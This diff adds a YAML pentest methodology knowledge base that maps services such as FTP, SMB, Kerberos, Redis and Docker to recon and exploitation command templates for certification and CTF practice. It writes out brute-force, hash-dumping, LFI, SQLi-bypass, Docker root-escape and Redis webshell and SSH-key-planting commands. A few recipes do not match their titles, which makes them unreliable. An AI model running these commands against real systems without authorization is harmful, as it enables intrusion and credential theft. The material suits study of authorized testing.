@@ -1,0 +1,462 @@
+# Synapse Pentest Methodology Knowledge Base
+# Comprehensive checklists, command recipes, and attack vectors for 45+ network & web services
+# Tailored for eJPTv2, OSCP, CPTS, CTFs, and real-world penetration tests.
+# Variables available in command_template:
+#   {IP}      - Target IP address or hostname
+#   {PORT}    - Service port number
+#   {HOST}    - Hostname / FQDN (falls back to IP)
+#   {USER}    - Discovered or default username
+#   {PASS}    - Discovered or default password
+#   {DOMAIN}  - Target Active Directory domain / workgroup
+#   {WORDLIST}- Standard wordlist path
+
+services:
+  ftp:
+    ports: [21, 2121]
+    name_patterns: ["^ftp", "vsftpd", "pure-ftpd", "proftpd"]
+    checklists:
+      - category: "recon"
+        title: "Check Anonymous FTP Login"
+        description: "Verify if anonymous access is enabled (anonymous:anonymous or ftp:ftp)"
+        command_template: "nmap --script ftp-anon -p {PORT} {IP}"
+      - category: "enum"
+        title: "Enumerate Directory Structure & Writable Paths"
+        description: "List all directories, check for hidden dotfiles, and test write permissions"
+        command_template: "wget -m --no-passive ftp://anonymous:anonymous@{IP}:{PORT}/"
+      - category: "vuln_check"
+        title: "Check Version for Known Exploits"
+        description: "Search for known vulnerabilities (e.g. vsftpd 2.3.4 backdoor, ProFTPD 1.3.5 mod_copy)"
+        command_template: "searchsploit {PRODUCT} {VERSION}"
+      - category: "exploit"
+        title: "Password Spray / Brute-force Default Credentials"
+        description: "Test known credentials or targeted wordlists against FTP service"
+        command_template: "hydra -L users.txt -P passwords.txt -s {PORT} ftp://{IP}"
+
+  ssh:
+    ports: [22, 2222]
+    name_patterns: ["^ssh", "openssh", "dropbear"]
+    checklists:
+      - category: "recon"
+        title: "Banner & Supported Algorithms Audit"
+        description: "Extract SSH banner, supported authentication methods, and key exchange algorithms"
+        command_template: "nmap --script ssh2-enum-algos,ssh-auth-methods -p {PORT} {IP}"
+      - category: "enum"
+        title: "SSH User Enumeration (CVE-2018-15473)"
+        description: "Test if OpenSSH version is vulnerable to username timing/enumeration"
+        command_template: "nmap --script ssh-run -p {PORT} {IP}"
+      - category: "exploit"
+        title: "Credential Spraying & Key Auth Test"
+        description: "Test discovered passwords, default credentials, or id_rsa keys against SSH"
+        command_template: "hydra -L users.txt -p {PASS} -s {PORT} ssh://{IP} -t 4"
+
+  telnet:
+    ports: [23]
+    name_patterns: ["^telnet"]
+    checklists:
+      - category: "recon"
+        title: "Telnet Banner Grab & Cleartext Prompt Check"
+        description: "Connect to Telnet to inspect login prompts and default system banners"
+        command_template: "nc -vn {IP} {PORT}"
+      - category: "exploit"
+        title: "Default & Root Credential Testing"
+        description: "Test common default embedded credentials (admin:admin, root:root, cisco:cisco)"
+        command_template: "hydra -L users.txt -P passwords.txt -s {PORT} telnet://{IP}"
+
+  smtp:
+    ports: [25, 465, 587]
+    name_patterns: ["^smtp", "postfix", "exim", "sendmail"]
+    checklists:
+      - category: "enum"
+        title: "SMTP User Enumeration (VRFY / EXPN / RCPT TO)"
+        description: "Enumerate local system users via VRFY/EXPN SMTP commands"
+        command_template: "nmap --script smtp-enum-users,smtp-commands -p {PORT} {IP}"
+      - category: "vuln_check"
+        title: "Test Open Relay & Known Exploits"
+        description: "Check if the mail server permits unauthorized relaying or suffers from Exim CVEs"
+        command_template: "nmap --script smtp-open-relay,smtp-vuln* -p {PORT} {IP}"
+
+  dns:
+    ports: [53]
+    name_patterns: ["^domain", "^dns", "bind"]
+    checklists:
+      - category: "enum"
+        title: "Attempt DNS Zone Transfer (AXFR)"
+        description: "Try to dump complete DNS zone file across all domain names"
+        command_template: "dig axfr @{IP} {DOMAIN}"
+      - category: "enum"
+        title: "Subdomain & Reverse IP Brute-Force"
+        description: "Enumerate subdomains and PTR records using DNS wordlist"
+        command_template: "dig @{IP} -x {IP} ANY"
+
+  tftp:
+    ports: [69]
+    name_patterns: ["^tftp"]
+    checklists:
+      - category: "enum"
+        title: "Test Unauthenticated TFTP File Download"
+        description: "Attempt downloading common configuration files (id_rsa, running-config, boot.ini)"
+        command_template: "tftp {IP} -c get running-config"
+
+  finger:
+    ports: [79]
+    name_patterns: ["^finger"]
+    checklists:
+      - category: "enum"
+        title: "Query System Users via Finger Protocol"
+        description: "Enumerate logged-in users and home directory paths"
+        command_template: "finger @{IP}"
+
+  http:
+    ports: [80, 443, 8080, 8443, 8000, 8008, 8888, 9000, 5000, 3000]
+    name_patterns: ["^http", "^https", "^ssl/http", "apache", "nginx", "iis", "lighttpd", "werkzeug", "caddy"]
+    checklists:
+      - category: "recon"
+        title: "Identify Web Technology Stack & Headers"
+        description: "Inspect HTTP response headers, cookies, server tokens, and Wappalyzer/whatweb signatures"
+        command_template: "whatweb http://{IP}:{PORT}"
+      - category: "recon"
+        title: "Inspect Standard Files (robots.txt, sitemap.xml, .git, .env)"
+        description: "Check for configuration leaks, exposed git repositories, or sensitive disclosures"
+        command_template: "curl -s -L http://{IP}:{PORT}/robots.txt"
+      - category: "enum"
+        title: "Content & Directory Brute-Forcing (ffuf / gobuster)"
+        description: "Fuzz for hidden endpoints, administrative panels, backup files (.bak, .old, .zip)"
+        command_template: "ffuf -u http://{IP}:{PORT}/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,204,301,302,307,401,403 -c"
+      - category: "vuln_check"
+        title: "Scan with Nikto & Nuclei"
+        description: "Run automated web vulnerability detection templates for misconfigurations and CVEs"
+        command_template: "nikto -h http://{IP}:{PORT}"
+      - category: "enum"
+        title: "Virtual Host & Subdomain Discovery"
+        description: "Fuzz Host header for alternate vhosts or dev environments"
+        command_template: "ffuf -u http://{IP}:{PORT} -H 'Host: FUZZ.{DOMAIN}' -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0"
+      - category: "vuln_check"
+        title: "Test Authentication Forms (Default & SQLi Auth Bypass)"
+        description: "Test login pages for default credentials (admin:admin, admin:password) and basic SQL injection (`' or 1=1--`)"
+        command_template: "curl -s -i -X POST http://{IP}:{PORT}/login -d 'username=admin&password=password'"
+      - category: "vuln_check"
+        title: "Test Parameters for LFI / Path Traversal"
+        description: "Test URL parameters, headers, and view parameters for directory traversal (/etc/passwd, win.ini)"
+        command_template: "curl -s 'http://{IP}:{PORT}/page?file=../../../../etc/passwd'"
+
+  kerberos:
+    ports: [88]
+    name_patterns: ["^kerberos", "kdc"]
+    checklists:
+      - category: "enum"
+        title: "Kerberos User Enumeration (Kerbrute)"
+        description: "Enumerate valid Active Directory usernames quickly without triggering lockouts"
+        command_template: "kerbrute userenum --dc {IP} -d {DOMAIN} users.txt"
+      - category: "exploit"
+        title: "AS-REP Roasting (Accounts with DONT_REQ_PREAUTH)"
+        description: "Request AS-REP tickets for users without pre-authentication to crack offline"
+        command_template: "GetNPUsers.py {DOMAIN}/ -dc-ip {IP} -no-pass -usersfile users.txt -format hashcat -outputfile asreproast.hashes"
+      - category: "exploit"
+        title: "Kerberoasting (Service Principal Names)"
+        description: "Request TGS service tickets for SPNs using valid domain user credentials to crack offline"
+        command_template: "GetUserSPNs.py {DOMAIN}/{USER}:{PASS} -dc-ip {IP} -request -outputfile kerberoast.hashes"
+
+  rpc_nfs:
+    ports: [111, 2049]
+    name_patterns: ["^rpcbind", "^nfs", "^mountd"]
+    checklists:
+      - category: "recon"
+        title: "List Exported NFS Mounts"
+        description: "Check for readable or writable NFS shares exposed to the network"
+        command_template: "showmount -e {IP}"
+      - category: "enum"
+        title: "Mount Exported NFS Share Locally"
+        description: "Mount share to /tmp/nfs and check file permissions, SSH keys, or root_squash settings"
+        command_template: "mkdir -p /tmp/nfs && mount -t nfs {IP}:/share /tmp/nfs -o nolock"
+      - category: "privesc"
+        title: "Check no_root_squash for SUID Binary Injection"
+        description: "If no_root_squash is configured, write a root SUID shell binary from attacking machine"
+        command_template: "cp /bin/bash /tmp/nfs/bash && chmod +s /tmp/nfs/bash"
+
+  msrpc:
+    ports: [135, 593]
+    name_patterns: ["^msrpc", "^epmap", "endpoint mapper"]
+    checklists:
+      - category: "enum"
+        title: "Enumerate RPC Endpoints & Services"
+        description: "Query RPC endpoint mapper for listening interfaces and UUIDs"
+        command_template: "rpcdump.py {IP}"
+      - category: "enum"
+        title: "Attempt rpcclient Null Session"
+        description: "Test null session (rpcclient -U '') to query domain users, groups, and password policies"
+        command_template: "rpcclient -U '' -N {IP} -c 'enumdomusers; querydominfo; enumdomgroups'"
+
+  smb:
+    ports: [139, 445]
+    name_patterns: ["^netbios-ssn", "^microsoft-ds", "^smb", "samba"]
+    checklists:
+      - category: "recon"
+        title: "Enumerate SMB Version & OS Details"
+        description: "Determine exact SMB dialect, NetBIOS name, domain name, and signing status"
+        command_template: "netexec smb {IP}"
+      - category: "enum"
+        title: "Test Anonymous & Guest Share Access"
+        description: "Check for accessible shares (IPC$, C$, ADMIN$, custom public shares)"
+        command_template: "netexec smb {IP} -u '' -p '' --shares"
+      - category: "enum"
+        title: "Enumerate Users & Groups via RID Cycling"
+        description: "Extract domain/local usernames using RID cycling over anonymous SMB session"
+        command_template: "netexec smb {IP} -u 'guest' -p '' --rid-brute"
+      - category: "vuln_check"
+        title: "Check Known Critical SMB Vulnerabilities"
+        description: "Check for MS17-010 (EternalBlue), MS08-067, SMBGhost (CVE-2020-0796), and ZeroLogon"
+        command_template: "nmap --script smb-vuln* -p {PORT} {IP}"
+      - category: "exploit"
+        title: "Password Spray Discovered Credentials"
+        description: "Test found credentials across SMB services and verify administrative privileges (Pwn3d!)"
+        command_template: "netexec smb {IP} -u users.txt -p passwords.txt --continue-on-success"
+      - category: "exploit"
+        title: "Dump SAM / LSA Secrets / NTDS.dit"
+        description: "Dump password hashes with admin credentials using secretsdump.py"
+        command_template: "secretsdump.py {DOMAIN}/{USER}:{PASS}@{IP}"
+
+  snmp:
+    ports: [161, 162]
+    name_patterns: ["^snmp"]
+    checklists:
+      - category: "recon"
+        title: "Brute-force Community Strings"
+        description: "Test standard strings (public, private, manager, community, cisco)"
+        command_template: "onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt {IP}"
+      - category: "enum"
+        title: "Full SNMP Walk & Information Gathering"
+        description: "Walk MIB tree to extract system users, running processes, open ports, and routing tables"
+        command_template: "snmpwalk -v2c -c public {IP}"
+      - category: "enum"
+        title: "Run snmp-check for Formatted Report"
+        description: "Generate structured audit of network interfaces, hardware info, and storage"
+        command_template: "snmp-check {IP} -c public"
+
+  cups:
+    ports: [631]
+    name_patterns: ["^ipp", "cups"]
+    checklists:
+      - category: "recon"
+        title: "CUPS Web Interface & Version Audit"
+        description: "Check CUPS admin web console and test for CUPS RCE (CVE-2024-47176 / 47177)"
+        command_template: "curl -s http://{IP}:{PORT}/admin"
+
+  rsync:
+    ports: [873]
+    name_patterns: ["^rsync"]
+    checklists:
+      - category: "enum"
+        title: "List Anonymous Rsync Modules"
+        description: "Enumerate exposed rsync shares and permissions"
+        command_template: "rsync --list-only {IP}::"
+      - category: "enum"
+        title: "Download Exposed Rsync Share"
+        description: "Mirror rsync share contents to local directory"
+        command_template: "rsync -avz {IP}::module_name /tmp/rsync_loot"
+
+  ldap:
+    ports: [389, 636, 3268, 3269]
+    name_patterns: ["^ldap", "^ldaps", "microsoft-ds"]
+    checklists:
+      - category: "recon"
+        title: "Test Anonymous LDAP Bind & Base DN"
+        description: "Extract namingContexts, domain components, and supported SASL mechanisms"
+        command_template: "ldapsearch -x -H ldap://{IP}:{PORT} -s base '(objectclass=*)' namingContexts"
+      - category: "enum"
+        title: "Dump Active Directory Objects via LDAP"
+        description: "Extract domain users, descriptions, service accounts, and group memberships"
+        command_template: "ldapsearch -x -H ldap://{IP}:{PORT} -b '{DOMAIN}' '(objectClass=user)' sAMAccountName description"
+      - category: "enum"
+        title: "AD CS Certificate Template Audit (Certipy)"
+        description: "Enumerate vulnerable Active Directory Certificate Services templates (ESC1 - ESC13)"
+        command_template: "certipy find -u '{USER}@{DOMAIN}' -p '{PASS}' -dc-ip {IP} -vulnerable"
+      - category: "enum"
+        title: "Run BloodHound Ingestion"
+        description: "Collect complete domain graph for privilege escalation analysis"
+        command_template: "bloodhound-python -u '{USER}' -p '{PASS}' -d {DOMAIN} -dc {HOST} -c All -ns {IP}"
+
+  jmx_rmi:
+    ports: [1099, 9010]
+    name_patterns: ["^rmiregistry", "java-rmi", "jmx"]
+    checklists:
+      - category: "enum"
+        title: "Enumerate Java RMI & JMX MBeans"
+        description: "Check for unauthenticated JMX console and MBean code execution"
+        command_template: "nmap --script rmi-vuln-classloader,rmi-dumpregistry -p {PORT} {IP}"
+
+  mssql:
+    ports: [1433]
+    name_patterns: ["^ms-sql-s", "mssql", "microsoft sql"]
+    checklists:
+      - category: "recon"
+        title: "Check MSSQL Server Instance Info"
+        description: "Identify SQL server version, instance names, and authentication mode"
+        command_template: "netexec mssql {IP}"
+      - category: "exploit"
+        title: "Test Default 'sa' and Discovered Credentials"
+        description: "Test sa account with blank/default passwords or found credentials"
+        command_template: "netexec mssql {IP} -u 'sa' -p '' --local-auth"
+      - category: "exploit"
+        title: "Execute Commands via xp_cmdshell"
+        description: "Enable and invoke xp_cmdshell using mssqlclient to obtain interactive shell"
+        command_template: "mssqlclient.py {USER}:{PASS}@{IP} -windows-auth"
+
+  oracle:
+    ports: [1521]
+    name_patterns: ["^oracle", "tns"]
+    checklists:
+      - category: "enum"
+        title: "Enumerate Oracle SIDs and TNS Listener"
+        description: "Identify valid Oracle SID names (ORCL, XE, PLSExtProc)"
+        command_template: "odat sidguesser -s {IP} -p {PORT}"
+      - category: "exploit"
+        title: "Test Default Accounts & Password Hashes"
+        description: "Test default credentials (SYS/change_on_install, SYSTEM/manager, SCOTT/tiger)"
+        command_template: "odat passwordguesser -s {IP} -p {PORT} -d {DOMAIN}"
+
+  docker:
+    ports: [2375, 2376]
+    name_patterns: ["^docker"]
+    checklists:
+      - category: "recon"
+        title: "Query Unauthenticated Docker API /version"
+        description: "Verify if Docker daemon API is exposed without TLS authentication"
+        command_template: "curl -s http://{IP}:{PORT}/version"
+      - category: "exploit"
+        title: "Spawn Root Container Mounting Host Filesystem"
+        description: "Mount host / to container /mnt to achieve instant root privilege on the host"
+        command_template: "docker -H tcp://{IP}:{PORT} run -v /:/mnt --rm -it alpine chroot /mnt sh"
+
+  squid:
+    ports: [3128]
+    name_patterns: ["^squid", "http-proxy"]
+    checklists:
+      - category: "enum"
+        title: "Test Open Squid HTTP Proxy Tunnel"
+        description: "Check if proxy permits pivoting to internal localhost or internal subnets"
+        command_template: "curl -x http://{IP}:{PORT} http://127.0.0.1"
+
+  mysql:
+    ports: [3306]
+    name_patterns: ["^mysql", "mariadb"]
+    checklists:
+      - category: "recon"
+        title: "Check MySQL Server Version & Auth Requirements"
+        description: "Inspect greeting banner, SSL support, and auth plugins"
+        command_template: "nmap --script mysql-info -p {PORT} {IP}"
+      - category: "exploit"
+        title: "Test Root Without Password & Default Accounts"
+        description: "Attempt direct login as root or test discovered credentials"
+        command_template: "mysql -h {IP} -P {PORT} -u root"
+      - category: "enum"
+        title: "Dump Databases & Check INTO OUTFILE Privileges"
+        description: "Enumerate databases, tables, user hashes, and file write permissions"
+        command_template: "nmap --script mysql-databases,mysql-users,mysql-empty-password -p {PORT} {IP}"
+
+  rdp:
+    ports: [3389]
+    name_patterns: ["^ms-wbt-server", "^rdp"]
+    checklists:
+      - category: "recon"
+        title: "Check RDP Encryption & NLA Requirements"
+        description: "Check if Network Level Authentication (NLA) is enforced"
+        command_template: "nmap --script rdp-enum-encryption,rdp-ntlm-info -p {PORT} {IP}"
+      - category: "vuln_check"
+        title: "Check for BlueKeep (CVE-2019-0708)"
+        description: "Verify if system is vulnerable to unauthenticated RCE via BlueKeep"
+        command_template: "nmap --script rdp-vuln-ms12-020,rdp-vuln-cve2019-0708 -p {PORT} {IP}"
+      - category: "exploit"
+        title: "Test Discovered Credentials via xfreerdp"
+        description: "Connect to RDP desktop session using verified user credentials"
+        command_template: "xfreerdp /v:{IP} /u:{USER} /p:'{PASS}' /cert:ignore"
+
+  postgres:
+    ports: [5432]
+    name_patterns: ["^postgresql", "^postgres"]
+    checklists:
+      - category: "exploit"
+        title: "Test Default 'postgres' Account Credentials"
+        description: "Test login with postgres:postgres or blank password"
+        command_template: "psql -h {IP} -p {PORT} -U postgres"
+      - category: "exploit"
+        title: "Execute System Commands via COPY PROGRAM"
+        description: "Execute arbitrary commands via PostgreSQL COPY command (requires superuser)"
+        command_template: "psql -h {IP} -p {PORT} -U {USER} -c \"COPY cmd_exec FROM PROGRAM 'id';\""
+
+  vnc:
+    ports: [5900, 5901, 5902]
+    name_patterns: ["^vnc"]
+    checklists:
+      - category: "recon"
+        title: "Check VNC Authentication Method & Security Types"
+        description: "Test if VNC server allows 'None' (no password) authentication"
+        command_template: "nmap --script vnc-info,vnc-title -p {PORT} {IP}"
+      - category: "exploit"
+        title: "Brute-force VNC Password"
+        description: "Test top passwords or password wordlists against VNC"
+        command_template: "hydra -P /usr/share/wordlists/rockyou.txt -s {PORT} {IP} vnc"
+
+  winrm:
+    ports: [5985, 5986]
+    name_patterns: ["^wsman", "^winrm", "microsoft httpapi"]
+    checklists:
+      - category: "recon"
+        title: "Check WinRM Endpoint & NTLM Info"
+        description: "Query /wsman to extract NetBIOS domain, computer name, and OS build"
+        command_template: "netexec winrm {IP}"
+      - category: "exploit"
+        title: "Interactive PowerShell Shell via evil-winrm"
+        description: "Obtain high-privilege remote management shell with credentials or NTLM hash"
+        command_template: "evil-winrm -i {IP} -u '{USER}' -p '{PASS}'"
+
+  redis:
+    ports: [6379]
+    name_patterns: ["^redis"]
+    checklists:
+      - category: "recon"
+        title: "Check Unauthenticated Redis Access (INFO command)"
+        description: "Connect to Redis server and query server info and configuration"
+        command_template: "redis-cli -h {IP} -p 6379 INFO"
+      - category: "exploit"
+        title: "Write SSH Authorized Key to Target Root"
+        description: "Overwrite /root/.ssh/authorized_keys via Redis CONFIG SET dir and dbfilename"
+        command_template: "redis-cli -h {IP} -p {PORT} CONFIG SET dir /root/.ssh && redis-cli -h {IP} -p {PORT} CONFIG SET dbfilename authorized_keys && redis-cli -h {IP} -p {PORT} SAVE"
+      - category: "exploit"
+        title: "Inject Webshell or Cron Job RCE"
+        description: "Write php webshell to web root or crontab reverse shell to /var/spool/cron/crontabs/root"
+        command_template: "redis-cli -h {IP} -p {PORT} CONFIG SET dir /var/www/html && redis-cli -h {IP} -p {PORT} CONFIG SET dbfilename shell.php"
+
+  ajp:
+    ports: [8009]
+    name_patterns: ["^ajp13", "apache jserv"]
+    checklists:
+      - category: "vuln_check"
+        title: "Ghostcat (CVE-2020-1938) File Read / RCE"
+        description: "Read arbitrary files (WEB-INF/web.xml) or achieve RCE via Apache Tomcat AJP"
+        command_template: "python3 ajpShooter.py http://{IP}:{PORT} 8009 /WEB-INF/web.xml read"
+
+  mongodb:
+    ports: [27017]
+    name_patterns: ["^mongodb"]
+    checklists:
+      - category: "recon"
+        title: "Check Unauthenticated MongoDB Access & List DBs"
+        description: "Connect to MongoDB without credentials and list databases"
+        command_template: "mongosh --host {IP} --port {PORT} --eval 'db.adminCommand({listDatabases: 1})'"
+      - category: "enum"
+        title: "Dump Collections & Credential Hashes"
+        description: "Extract documents from user and authentication collections"
+        command_template: "mongodump --host {IP} --port {PORT} --out ./loot/mongo_{IP}"
+
+  generic_unknown:
+    ports: []
+    name_patterns: [".*"]
+    checklists:
+      - category: "recon"
+        title: "Raw TCP Banner Grab"
+        description: "Connect with netcat to inspect raw service response"
+        command_template: "nc -vn {IP} {PORT}"
+      - category: "enum"
+        title: "Run Comprehensive Nmap Service & Vuln Scripts"
+        description: "Probe unknown service with standard Nmap NSE scripts"
+        command_template: "nmap -sV -sC --version-all -p {PORT} {IP}"
